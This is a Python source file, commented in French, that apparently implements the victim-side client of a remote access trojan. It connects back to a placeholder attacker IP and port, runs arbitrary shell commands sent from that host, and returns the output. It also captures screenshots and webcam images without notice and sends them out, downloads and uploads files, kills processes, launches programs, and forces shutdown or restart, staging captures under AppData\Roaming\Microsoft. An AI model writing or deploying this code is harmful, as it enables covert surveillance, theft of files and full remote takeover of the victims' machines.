import socket
import time
import subprocess
import os
import cv2
import mss
# je sais pas pk mais le tasklist affiche pas tout faut trouver solution surement car trop long 
# s'executer dans le start
def connect(): 
    global client
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(("IP_ADRESS", IP_PORT))
            client.send("Client1".encode())
            break
        except:
            time.sleep(5)

cwd = os.getcwd()

savepath = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Microsoft\\"
connect()
while True:
    
    try:
        message = client.recv(1024).decode()

        if message[:2].lower() == "cd" :
            if os.path.exists(message[3:]):
                cwd=message[3:]
                client.send(f"  [>] new dir : {cwd}".encode())
            else:
                client.send("  [>] The directory name is invalid".encode())

        elif message[:6].lower() == "screen" :
            screenName = message[7:]
            with mss.mss() as sct:
                try:
                    screenshot = sct.grab(sct.monitors[int(screenName)])
                    mss.tools.to_png(screenshot.rgb, screenshot.size, output=savepath + "capturescreen.png")
                    with open(savepath + 'capturescreen.png', "rb") as f:
                        client.sendall(f.read())
                    f.close()
                    os.remove(savepath + "capturescreen.png")
                except:
                    client.send("$$STOP$$".encode())

        elif message[:3].lower() == "cam" :
            try:
                camNum = int(message[4:])
                cap = cv2.VideoCapture(camNum)
                ret, frame = cap.read()
                cv2.imwrite(savepath + "capturecam.png", frame)
                cap.release()
                with open(savepath + "capturecam.png", "rb") as f:
                    client.sendall(f.read())
                f.close()
                os.remove(savepath + "capturecam.png") 
            except:
                client.send("$$STOP$$".encode())

        elif message[:8].lower() == "download":
            fileDownload = (cwd + "\\" + message[9:])
            if os.path.isfile(fileDownload):
                with open(message[9:], "rb") as f:
                    client.sendall(f.read())
                continue
            else:
                client.send(b"$$STOP$$")
                continue

        elif message[:6].lower() == "upload":
            fileUpload=os.path.basename(message[7:])
            with open(fileUpload, "wb") as f:
                client.settimeout(2)
                try:
                    while True:
                        data = client.recv(1024)
                        f.write(data)
                except socket.timeout:
                    client.settimeout(None)
            client.send("  [>] Upload has ended.".encode())
            f.close()

        elif message[:4].lower() == "kill":
            if message[5:].isdigit():
                response = subprocess.run("taskkill /F /PID " + message[5:], shell=True, capture_output=True, text=True, cwd=cwd)
            elif type(message[5:]) == str:
                response = subprocess.run("taskkill /F /IM " + message[5:], shell=True, capture_output=True, text=True, cwd=cwd)
            if response.returncode == 0 :
                client.sendall(response.stdout.encode())
            else:
                client.send("  [>] This process does not exist".encode())

        elif message[:5].lower() == "start":
            if os.path.isfile(message[6:]):
                subprocess.Popen(message, shell=True, cwd=cwd)
                client.send("  [>] File has been executed.".encode())
            else:
                client.send("  [>] This file does not exist".encode())

        elif message[:8].lower() == "shutdown":
            client.send("  [>] Shutting down...".encode())
            subprocess.run("shutdown /s /f /t 0", shell=True, capture_output=True, text=True, cwd=cwd)

        elif message[:7].lower() == "restart":
            client.send("  [>] Restarting...".encode())
            subprocess.run("shutdown /r /f /t 0", shell=True, capture_output=True, text=True, cwd=cwd)
        else:
            response = subprocess.run(message, shell=True, capture_output=True, text=True, cwd=cwd)
            if response.returncode == 0 :
                client.sendall(response.stdout.encode())
            else:
                client.send("  [>] This is not an existing command".encode())
    except:
        connect()